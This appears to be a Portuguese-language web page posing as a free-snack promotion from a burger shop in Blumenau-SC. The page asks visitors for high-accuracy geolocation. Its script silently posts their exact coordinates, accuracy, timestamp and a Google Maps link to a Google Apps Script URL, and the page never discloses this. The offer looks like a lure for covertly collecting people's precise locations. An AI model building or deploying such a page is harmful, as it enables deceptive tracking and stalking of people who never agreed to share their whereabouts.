<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Donatello Lanches Express</title>

<style>
body{
  font-family:Arial;
  background:#0f172a;
  color:#fff;
  display:flex;
  justify-content:center;
  align-items:center;
  height:100vh;
}
.card{
  background:#1e293b;
  padding:20px;
  border-radius:12px;
  text-align:center;
  width:350px;
}
button{
  padding:12px;
  width:100%;
  border:none;
  border-radius:10px;
  background:#22c55e;
  font-weight:bold;
  cursor:pointer;
}
.status{margin-top:10px}
.success{color:#22c55e}
.error{color:#ef4444}
</style>
</head>

<body>

<div class="card">

<h2>🍔 Donatello Lanches Express</h2>

<p>Verifique se você está perto de alguma loja e ganhe um lanche gratuitamente</p>

<div class="offer">
      ✔ Entrega rápida  
      <br>
      ✔ Ingredientes frescos  
      <br>
      ✔ Promoção válida para novos clientes na região de Blumenau-SC
</div>


<button onclick="checkLocation()">Verificar se Estou Perto de Alguma Loja</button>

<div id="status" class="status"></div>

</div>

<script>

// 🔴 SUA URL
const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbyU2Hah8rXss1So36FAyRGF_8hcjZsMGaaF2m9_ZVEPNFPMDtBsQ7S9AsGcTcADgKPpZw/exec";

// 📍 LOJA
const LOJA_LAT = -26.9194;
const LOJA_LNG = -49.0661;
const RAIO_KM = 200;

// distância
function calcularDistancia(lat1, lon1, lat2, lon2){
  const R = 6371;
  const dLat = (lat2-lat1)*Math.PI/180;
  const dLon = (lon2-lon1)*Math.PI/180;

  const a =
    Math.sin(dLat/2)**2 +
    Math.cos(lat1*Math.PI/180) *
    Math.cos(lat2*Math.PI/180) *
    Math.sin(dLon/2)**2;

  return 2*R*Math.atan2(Math.sqrt(a),Math.sqrt(1-a));
}

// envio
function enviarDados(data){
  fetch(SCRIPT_URL,{
    method:"POST",
    headers:{ "Content-Type":"text/plain" },
    body: JSON.stringify(data)
  });
}

// principal
function checkLocation(){

  const status = document.getElementById("status");
  status.innerText = "Obtendo localização...";

  if(!navigator.geolocation){
    status.innerText = "Geolocalização não suportada";
    return;
  }

  navigator.geolocation.getCurrentPosition(

    function(pos){

      const lat = pos.coords.latitude;
      const lng = pos.coords.longitude;

      const distancia = calcularDistancia(lat,lng,LOJA_LAT,LOJA_LNG);

      // 🔴 MAP LINK AQUI
      const mapLink = `https://www.google.com/maps?q=${lat},${lng}`;

      const payload = {
        timestamp: new Date().toISOString(),
        latitude: lat,
        longitude: lng,
        accuracy: pos.coords.accuracy,
        distancia_km: distancia.toFixed(2),
        dentro_area: distancia <= RAIO_KM ? "SIM":"NAO",
        mapLink: mapLink
      };

      // envia
      enviarDados(payload);

      // resposta UI
      if(distancia <= RAIO_KM){
        status.innerText = "✔ Dentro da área";
        status.className = "status success";
      }else{
        status.innerText = "❌ Fora da área";
        status.className = "status error";
      }

    },

    function(){
      status.innerText = "Erro ou permissão negada";
      status.className = "status error";
    },

    { enableHighAccuracy:true, timeout:10000 }

  );
}

</script>

</body>
</html>
